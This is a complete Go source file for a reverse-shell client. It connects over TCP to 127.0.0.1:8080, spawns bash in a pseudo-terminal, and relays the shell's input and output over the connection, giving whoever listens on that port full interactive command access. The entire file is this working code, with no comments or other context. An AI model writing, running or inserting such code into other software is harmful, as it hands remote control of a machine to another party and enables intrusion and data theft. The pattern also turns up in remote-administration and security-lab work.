package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

func main() {

	fmt.Println("Initializing client...")

	conn, err := net.Dial("tcp", "127.0.0.1:8080")

	if err != nil {
		fmt.Println("Error initializing client", err)
		os.Exit(1)
	}

	fmt.Println("Connected")

	cmd := exec.Command("bash")
	ptmx, _ := pty.Start(cmd)

	go func() { io.Copy(ptmx, conn) }()
	io.Copy(conn, ptmx)

	ptmx.Close()
	conn.Close()
}
